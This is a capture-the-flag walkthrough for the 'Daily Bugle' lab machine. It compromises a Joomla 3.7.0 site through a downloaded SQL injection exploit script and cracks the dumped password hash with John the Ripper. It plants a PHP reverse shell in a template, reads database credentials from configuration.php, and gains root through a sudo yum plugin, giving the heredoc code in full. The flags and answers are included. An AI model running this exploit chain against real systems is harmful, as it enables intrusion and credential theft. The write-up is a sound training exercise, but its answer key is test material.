# Daily Bugle

---

IP = `10.10.140.132`

## Task 1 - Deploy

> Access the web server, who robbed the bank?

`spiderman`

## Task 2 - Obtain user and root

`http://10.10.140.132/robots.txt`

```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

```
/administrator        (Status: 301) [Size: 243] [--> http://10.10.140.132/administrator/]
/bin                  (Status: 301) [Size: 233] [--> http://10.10.140.132/bin/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.140.132/cache/]
/cgi-bin/             (Status: 403) [Size: 210]
/cgi-bin/.html        (Status: 403) [Size: 215]
/components           (Status: 301) [Size: 240] [--> http://10.10.140.132/components/]
/configuration.php    (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 236] [--> http://10.10.140.132/images/]
/includes             (Status: 301) [Size: 238] [--> http://10.10.140.132/includes/]
/index.php            (Status: 200) [Size: 9280]
/index.php            (Status: 200) [Size: 9280]
/language             (Status: 301) [Size: 238] [--> http://10.10.140.132/language/]
/layouts              (Status: 301) [Size: 237] [--> http://10.10.140.132/layouts/]
/libraries            (Status: 301) [Size: 239] [--> http://10.10.140.132/libraries/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/media                (Status: 301) [Size: 235] [--> http://10.10.140.132/media/]
/modules              (Status: 301) [Size: 237] [--> http://10.10.140.132/modules/]
/plugins              (Status: 301) [Size: 237] [--> http://10.10.140.132/plugins/]
/README.txt           (Status: 200) [Size: 4494]
/robots.txt           (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/templates            (Status: 301) [Size: 239] [--> http://10.10.140.132/templates/]
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.140.132/tmp/]
/web.config.txt       (Status: 200) [Size: 1690]

```

> What is the Joomla version?

`3.7.0`

PoC:

`http://10.10.140.132/administrator/manifests/files/joomla.xml`

> What is Jonah's cracked password?

`spiderman123`

PoC:

```bash
wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/refs/heads/master/joomblah.py
python3 joomblah.py http://10.10.140.132:80
```

```
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

`echo "$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm" > jonah.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt jonah.txt`

**Reverse Shell**

change beez3 template's index.php file with php-reverse-shell.php (pentestmonkey)

`http://10.10.140.132/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA`

then load http://10.10.140.132/index.php

```
sh-4.2$ pwd
/var/www/html
pwd
sh-4.2$ ls
ls
LICENSE.txt
README.txt
administrator
bin
cache
cli
components
configuration.php
htaccess.txt
images
includes
index.php
language
layouts
libraries
media
modules
plugins
robots.txt
templates
tmp
web.config.txt
sh-4.2$
```

```
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}sh-4.2$
```
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';

Tied for root, but shows authentication failure!
Lets try with jjameson

Login successful

`jjameson:nv5uz9r3ZEDzVjNu`



> What is the user flag?

`27a260fe3cba712cfdedb1c86d80442e`

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cd /tmp
[jjameson@dailybugle tmp]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle tmp]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle tmp]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle tmp]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2#

```

> What is the root flag?

`eec3d53292b1821868266858d7fa6f79`